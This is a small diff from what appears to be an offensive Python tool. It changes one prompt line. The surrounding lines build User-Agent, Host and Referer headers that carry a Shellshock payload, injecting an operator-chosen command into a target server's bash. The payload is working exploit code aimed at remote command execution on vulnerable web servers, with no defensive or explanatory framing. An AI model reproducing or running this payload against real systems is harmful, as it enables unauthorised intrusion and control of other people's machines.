@@ -132,7 +132,7 @@ def commandIn():
                     
                     """
                     print(Colors.b,x)
-                    secim =input(Colors.y,"Choose:")
+                    secim =input("Choose:")
                     headers = {"User-Agent": "() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
                     host = {"Host":"() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
                     referer = {"Referer":"() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
